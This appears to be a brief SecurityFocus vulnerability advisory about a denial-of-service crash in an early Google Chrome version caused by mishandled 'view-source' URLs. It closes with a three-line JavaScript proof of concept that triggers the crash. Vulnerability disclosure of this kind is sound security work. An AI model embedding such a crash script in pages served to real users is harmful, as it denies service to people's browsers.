source: http://www.securityfocus.com/bid/31035/info

Google Chrome is prone to a remote denial-of-service vulnerability because the application fails to handle specially crafted HTTP 'view-source' headers.

Attackers can exploit this issue to crash the affected application, denying service to legitimate users.

Google Chrome 0.2.149.27 is vulnerable; other versions may also be affected. 

<script>
a = window.open("view-source:http://123")
a.alert(1)
</script>

